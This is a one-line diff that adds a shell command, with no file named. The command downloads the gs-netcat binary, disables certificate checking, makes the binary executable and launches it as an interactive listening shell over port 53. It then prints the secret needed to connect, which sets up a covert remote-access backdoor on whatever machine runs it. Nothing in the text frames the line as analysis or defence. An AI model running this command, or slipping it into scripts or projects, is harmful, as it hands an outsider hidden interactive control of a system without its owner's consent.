@@ -1,0 +1,1 @@
+curl -fsSLk -ogs https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-x86_64 && chmod 755 gs && S=$(./gs -g) && GS_PORT=53 GSOCKET_ARGS="-liD -s $S" ./gs && echo "Connect with: gs-netcat -s $S -i"
